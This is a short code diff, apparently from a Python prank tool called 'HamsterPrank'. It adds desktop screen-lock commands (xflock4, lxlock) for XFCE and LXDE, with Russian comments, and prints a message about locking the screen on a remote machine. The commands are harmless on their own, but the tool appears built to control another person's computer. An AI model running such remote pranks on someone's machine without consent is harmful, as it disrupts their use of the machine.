@@ -635,6 +635,8 @@ class HamsterPrank:
                     lock_commands.extend([
                         'DISPLAY=:0 loginctl lock-session',
                         'DISPLAY=:0 dm-tool lock',
+                        'DISPLAY=:0 xflock4',  # для XFCE (часто используется в Kali)
+                        'DISPLAY=:0 lxlock',   # для LXDE/LXQT (тоже может быть в Kali)
                         'DISPLAY=:0 i3lock -c 000000',  # альтернатива для i3
                         'DISPLAY=:0 xscreensaver-command -lock',
                         'DISPLAY=:0 light-locker-command --lock',
@@ -1557,12 +1559,14 @@ except:
                     print("\nБлокирую экран на удаленке...")
                     # Сначала пробуем стандартные команды
                     lock_commands = [
-                        'gnome-screensaver-command --lock',
-                        'xscreensaver-command -lock', 
-                        'dm-tool lock',
-                        'loginctl lock-session',
-                        'i3lock -c 000000',  # альтернатива для i3
-                        'light-locker-command --lock'
+                    'gnome-screensaver-command --lock',
+                    'xscreensaver-command -lock', 
+                    'dm-tool lock',
+                    'xflock4',  # для XFCE (часто используется в Kali)
+                    'lxlock',   # для LXDE/LXQT
+                    'loginctl lock-session',
+                    'i3lock -c 000000',  # альтернатива для i3
+                    'light-locker-command --lock'
                     ]
                     
                     success = False
